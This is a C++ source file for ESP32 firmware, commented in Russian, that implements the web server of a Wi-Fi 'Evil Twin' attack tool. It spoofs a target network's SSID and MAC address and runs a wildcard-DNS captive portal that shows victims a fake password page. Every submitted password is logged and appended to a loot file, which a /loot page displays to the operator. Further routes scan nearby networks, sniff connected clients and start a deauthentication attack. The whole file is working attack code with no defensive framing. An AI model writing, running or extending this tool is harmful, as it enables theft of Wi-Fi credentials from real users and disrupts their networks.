#include "web_server.h"
#include "monitoring.h"

// --- Глобальная переменная ---
WebServerManager webServerManager;

// --- Реализация CaptiveRequestHandler ---
void CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    File file = SPIFFS.open("/index.html", "r");
    if (!file) {
        request->send(500, "text/plain", "File not found");
        return;
    }
    String html = file.readString();
    file.close();
    html.replace("%SSID%", target_ssid);
    request->send(200, "text/html", html);
}

// --- Реализация WebServerManager ---
WebServerManager::WebServerManager() 
    : server(80), captiveHandler(nullptr), setup_mode(false), 
      evil_twin_active(false), credentials_captured(0), last_activity(0) {
}

WebServerManager::~WebServerManager() {
    stop();
}

bool WebServerManager::init() {
    if (!SPIFFS.begin(true)) {
        logMessage(LOG_ERROR, "SPIFFS mount failed");
        return false;
    }
    
    logMessage(LOG_INFO, "WebServerManager initialized successfully");
    return true;
}

bool WebServerManager::startSetupMode() {
    stop(); // Остановить предыдущий режим
    
    WiFi.softAP(SETUP_SSID);
    IPAddress apIP = WiFi.softAPIP();
    
    setup_mode = true;
    evil_twin_active = false;
    
    setupRoutes();
    server.begin();
    
    logMessage(LOG_INFO, "Setup AP started. SSID: %s, IP: %s", SETUP_SSID, apIP.toString().c_str());
    updateActivity();
    return true;
}

bool WebServerManager::startEvilTwin(const AttackConfig& config) {
    stop(); // Остановить предыдущий режим
    
    if (!ConfigManager::isValidSSID(config.target_ssid)) {
        logMessage(LOG_ERROR, "Invalid SSID for Evil Twin: %s", config.target_ssid);
        return false;
    }
    
    logMessage(LOG_INFO, "Starting Evil Twin AP. SSID: %s, Channel: %d", 
               config.target_ssid, config.target_channel);
    
    WiFi.mode(WIFI_AP);
    esp_wifi_set_mac(WIFI_IF_AP, &config.target_bssid[0]);
    WiFi.softAP(config.target_ssid, NULL, config.target_channel);
    
    IPAddress apIP = WiFi.softAPIP();
    dnsServer.start(53, "*", apIP);
    
    setup_mode = false;
    evil_twin_active = true;
    credentials_captured = 0;
    
    setupEvilTwinRoutes();
    
    // Создание captive handler
    if (captiveHandler) {
        delete captiveHandler;
    }
    captiveHandler = new CaptiveRequestHandler(String(config.target_ssid));
    server.addHandler(captiveHandler).setFilter(ON_AP_FILTER);
    
    server.begin();
    
    logMessage(LOG_INFO, "Evil Twin is running. Waiting for victims...");
    updateActivity();
    return true;
}

void WebServerManager::stop() {
    server.end();
    dnsServer.stop();
    
    if (captiveHandler) {
        delete captiveHandler;
        captiveHandler = nullptr;
    }
    
    setup_mode = false;
    evil_twin_active = false;
    
    logMessage(LOG_INFO, "Web server stopped");
}

void WebServerManager::handleLoop() {
    if (evil_twin_active) {
        dnsServer.processNextRequest();
    }
    
    // Проверка активности (опционально)
    static unsigned long last_check = 0;
    if (millis() - last_check > 60000) { // Каждую минуту
        if (last_activity > 0 && millis() - last_activity > 300000) { // 5 минут без активности
            logMessage(LOG_WARN, "No activity for 5 minutes");
        }
        last_check = millis();
    }
}

void WebServerManager::setupRoutes() {
    // Главная страница настройки
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
        handleRoot(request);
    });
    
    // Сканирование клиентов
    server.on("/scan_clients", HTTP_GET, [this](AsyncWebServerRequest *request) {
        handleScanClients(request);
    });
    
    // Результаты сканирования клиентов
    server.on("/clients_result", HTTP_GET, [this](AsyncWebServerRequest *request) {
        handleClientsResult(request);
    });
    
    // Просмотр захваченных данных
    server.on("/loot", HTTP_GET, [this](AsyncWebServerRequest *request) {
        handleLoot(request);
    });
    
    // Запуск атаки
    server.on("/attack", HTTP_GET, [this](AsyncWebServerRequest *request) {
        handleAttack(request);
    });

    // Маршруты мониторинга
    server.on("/dashboard", HTTP_GET, [](AsyncWebServerRequest *request) {
        String html = reportGenerator.generateDashboardHTML();
        request->send(200, "text/html", html);
    });

    server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        String html = reportGenerator.generateLogsHTML();
        request->send(200, "text/html", html);
    });

    server.on("/metrics", HTTP_GET, [](AsyncWebServerRequest *request) {
        String json = systemMonitor.generateMetricsJSON();
        request->send(200, "application/json", json);
    });

    server.on("/system_report", HTTP_GET, [](AsyncWebServerRequest *request) {
        String report = systemMonitor.generateSystemReport();
        request->send(200, "text/plain", report);
    });
}

void WebServerManager::setupEvilTwinRoutes() {
    // Статические файлы
    server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(SPIFFS, "/style.css", "text/css");
    });
    
    server.on("/app.js", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(SPIFFS, "/app.js", "application/javascript");
    });
    
    // Обработка попыток пароля
    server.on("/try_password", HTTP_POST, [this](AsyncWebServerRequest *request) {
        handleTryPassword(request);
    });
    
    // Получение финальных учетных данных
    server.on("/get_wifi_creds", HTTP_POST, [this](AsyncWebServerRequest *request) {
        handleGetWifiCreds(request);
    });
}

void WebServerManager::handleRoot(AsyncWebServerRequest *request) {
    updateActivity();
    
    File file = SPIFFS.open("/setup.html", "r");
    if (!file) {
        request->send(500, "text/plain", "File not found: setup.html");
        return;
    }
    
    String html = file.readString();
    file.close();
    
    String table_rows = generateNetworkTable();
    html.replace("%WIFI_TABLE_ROWS%", table_rows);
    
    request->send(200, "text/html", html);
}

void WebServerManager::handleScanClients(AsyncWebServerRequest *request) {
    updateActivity();
    
    std::vector<String> required = {"ssid", "bssid", "ch"};
    if (!validateRequest(request, required)) {
        request->send(400, "text/plain", "Missing required parameters");
        return;
    }
    
    String ssid = request->getParam("ssid")->value();
    String bssid = request->getParam("bssid")->value();
    String channel_str = request->getParam("ch")->value();
    
    // Валидация
    sanitizeInput(ssid, MAX_SSID_LENGTH);
    if (!ConfigManager::isValidSSID(ssid.c_str()) || 
        !ConfigManager::isValidMacAddress(bssid.c_str())) {
        request->send(400, "text/plain", "Invalid parameters");
        return;
    }
    
    int channel = channel_str.toInt();
    if (!ConfigManager::isValidChannel(channel)) {
        request->send(400, "text/plain", "Invalid channel");
        return;
    }
    
    // Запуск сниффинга
    if (!wifiAttackManager.startClientSniffing(ssid.c_str(), bssid.c_str(), channel)) {
        request->send(500, "text/plain", "Failed to start client sniffing");
        return;
    }
    
    String html = "<html><head><title>Scanning...</title><meta http-equiv='refresh' content='16;url=/clients_result'></head>";
    html += "<style>body{font-family:monospace; background:#282a36; color:#f8f8f2;} h1{color:#8be9fd;}</style>";
    html += "<body><h1>Scanning for clients... Please wait.</h1></body></html>";
    request->send(200, "text/html", html);
}

void WebServerManager::handleClientsResult(AsyncWebServerRequest *request) {
    updateActivity();
    
    String html = "<html><head><title>Scan Results</title>";
    html += "<style>body{font-family:monospace; background:#282a36; color:#f8f8f2;} h1{color:#50fa7b;} a{color:#8be9fd; text-decoration:none;} li{margin-bottom:5px;} a:hover{text-decoration:underline;}</style>";
    html += "</head><body><h1>Found Clients</h1><p>Click on a MAC address to select it for the attack.</p><ul>";
    
    auto clients = wifiAttackManager.getFoundClients();
    if (clients.empty()) {
        html += "<li>No clients found. Try again.</li>";
    } else {
        for (const auto& client : clients) {
            html += "<li><a href='/?client_mac=" + client + "'>" + client + "</a></li>";
        }
    }
    
    html += "</ul><br><a href='/'>Back to Setup</a></body></html>";
    request->send(200, "text/html", html);
}

void WebServerManager::handleLoot(AsyncWebServerRequest *request) {
    updateActivity();
    
    String html = "<html><head><title>Captured Data</title>";
    html += "<style>body{font-family:monospace; background:#282a36; color:#f8f8f2;} h1{color:#ff5555;} pre{background:#44475a; padding:15px; border-radius:5px; white-space:pre-wrap; word-wrap:break-word;} a{color:#8be9fd;}</style>";
    html += "</head><body><h1>Captured Credentials</h1>";
    html += "<a href='/'>Back to Setup</a><br><br>";
    html += "<pre>";
    
    File file = SPIFFS.open("/loot.txt", "r");
    if (file && file.size()) {
        while (file.available()) {
            html += (char)file.read();
        }
        file.close();
    } else {
        html += "No credentials captured yet.";
    }
    
    html += "</pre></body></html>";
    request->send(200, "text/html", html);
}

void WebServerManager::handleAttack(AsyncWebServerRequest *request) {
    updateActivity();

    std::vector<String> required = {"ssid", "ch", "duration", "bssid"};
    if (!validateRequest(request, required)) {
        request->send(400, "text/plain", "Missing required parameters");
        return;
    }

    String ssid = request->getParam("ssid")->value();
    String bssid = request->getParam("bssid")->value();
    String channel_str = request->getParam("ch")->value();
    String duration_str = request->getParam("duration")->value();
    String client_mac = request->hasParam("client_mac") ? request->getParam("client_mac")->value() : "";

    // Валидация
    sanitizeInput(ssid, MAX_SSID_LENGTH);
    if (!ConfigManager::isValidSSID(ssid.c_str()) ||
        !ConfigManager::isValidMacAddress(bssid.c_str())) {
        request->send(400, "text/plain", "Invalid SSID or BSSID");
        return;
    }

    int channel = channel_str.toInt();
    int duration_ms = duration_str.toInt() * 1000;

    if (!ConfigManager::isValidChannel(channel) || !ConfigManager::isValidDuration(duration_ms)) {
        request->send(400, "text/plain", "Invalid channel or duration");
        return;
    }

    if (!client_mac.isEmpty() && !ConfigManager::isValidMacAddress(client_mac.c_str())) {
        request->send(400, "text/plain", "Invalid client MAC");
        return;
    }

    // Создание конфигурации
    AttackConfig new_config;
    memset(&new_config, 0, sizeof(AttackConfig));

    ConfigManager::safeStrncpy(new_config.target_ssid, ssid.c_str(), sizeof(new_config.target_ssid));
    new_config.target_channel = channel;
    new_config.deauth_duration_ms = duration_ms;

    if (!ConfigManager::parseMac(bssid.c_str(), new_config.target_bssid)) {
        request->send(400, "text/plain", "Failed to parse BSSID");
        return;
    }

    if (!client_mac.isEmpty()) {
        ConfigManager::safeStrncpy(new_config.target_client_mac, client_mac.c_str(), sizeof(new_config.target_client_mac));
    }

    // Сохранение конфигурации
    if (!configManager.saveConfig(new_config)) {
        request->send(500, "text/plain", "Failed to save configuration");
        return;
    }

    EEPROM.write(0, 'Y');
    if (!EEPROM.commit()) {
        request->send(500, "text/plain", "Failed to commit EEPROM");
        return;
    }

    logMessage(LOG_INFO, "Attack configuration saved. Target: %s, Channel: %d",
               new_config.target_ssid, new_config.target_channel);

    String html = "<html><body style='font-family:sans-serif; background:#282a36; color:#ff5555;'>";
    html += "<h1>Attack initiated!</h1><p>Target: " + ssid + ". Device will reboot in 2 seconds.</p></body></html>";
    request->send(200, "text/html", html);

    delay(2000);
    ESP.restart();
}

void WebServerManager::handleTryPassword(AsyncWebServerRequest *request) {
    updateActivity();

    if (!request->hasParam("wifi_password", true)) {
        LOG_WEB(LOG_WARN, "Password attempt without password parameter");
        request->send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing password\"}");
        return;
    }

    String wifi_pass = request->getParam("wifi_password", true)->value();
    sanitizeInput(wifi_pass, MAX_PASSWORD_LENGTH);

    AttackConfig config;
    if (configManager.getConfig(config)) {
        LOG_ATTACK(LOG_INFO, "WIFI PASSWORD ATTEMPT CAPTURED - SSID: " + String(config.target_ssid) + ", PASS: " + wifi_pass);
        saveCredentials(String(config.target_ssid), wifi_pass);
        credentials_captured++;

        // Обновление метрик
        SystemMetrics metrics = systemMonitor.getMetrics();
        metrics.credentials_captured = credentials_captured;
    }

    request->send(200, "application/json", "{\"status\":\"fail\"}");
}

void WebServerManager::handleGetWifiCreds(AsyncWebServerRequest *request) {
    updateActivity();

    if (!request->hasParam("wifi_password", true)) {
        request->send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing password\"}");
        return;
    }

    String wifi_pass = request->getParam("wifi_password", true)->value();
    sanitizeInput(wifi_pass, MAX_PASSWORD_LENGTH);

    AttackConfig config;
    if (configManager.getConfig(config)) {
        logMessage(LOG_INFO, "FINAL WIFI PASSWORD CAPTURED - SSID: %s, PASS: %s",
                   config.target_ssid, wifi_pass.c_str());
        saveCredentials(String(config.target_ssid), wifi_pass);
        credentials_captured++;
    }

    request->send(200, "application/json", "{\"status\":\"success\"}");

    // Остановка сервера и перезагрузка
    stop();
    logMessage(LOG_INFO, "Attack completed. Rebooting to setup mode...");
    delay(2000);
    ESP.restart();
}

void WebServerManager::saveCredentials(const String& ssid, const String& password) {
    File file = SPIFFS.open("/loot.txt", "a");
    if (!file) {
        logMessage(LOG_ERROR, "Failed to open loot.txt for writing");
        return;
    }

    char timestamp[32];
    snprintf(timestamp, sizeof(timestamp), "[%lu]", millis());

    file.printf("%s SSID: %s, Password: %s\n", timestamp, ssid.c_str(), password.c_str());
    file.close();

    logMessage(LOG_INFO, "Credentials saved to /loot.txt");
}

String WebServerManager::generateNetworkTable() {
    auto networks = wifiAttackManager.scanNetworks();

    // Предварительно резервируем память для строки
    String table_rows;
    table_rows.reserve(networks.size() * 200); // Примерно 200 символов на строку

    for (const auto& network : networks) {
        // Используем более эффективную конкатенацию
        table_rows += "<tr><td>";
        table_rows += network.ssid;
        table_rows += "</td><td>";
        table_rows += network.bssid;
        table_rows += "</td><td>";
        table_rows += String(network.rssi);
        table_rows += "</td><td>";
        table_rows += String(network.channel);
        table_rows += "</td><td>";
        table_rows += WiFiAttackManager::getEncryptionTypeStr(network.encryption);
        table_rows += "</td><td><a href='#' onclick='setTarget(\"";
        table_rows += network.ssid;
        table_rows += "\",\"";
        table_rows += network.bssid;
        table_rows += "\",\"";
        table_rows += String(network.channel);
        table_rows += "\")'>Select</a></td></tr>";
    }

    return table_rows;
}

bool WebServerManager::validateRequest(AsyncWebServerRequest *request, const std::vector<String>& required_params) {
    for (const auto& param : required_params) {
        if (!request->hasParam(param)) {
            logMessage(LOG_WARN, "Missing required parameter: %s", param.c_str());
            return false;
        }
    }
    return true;
}
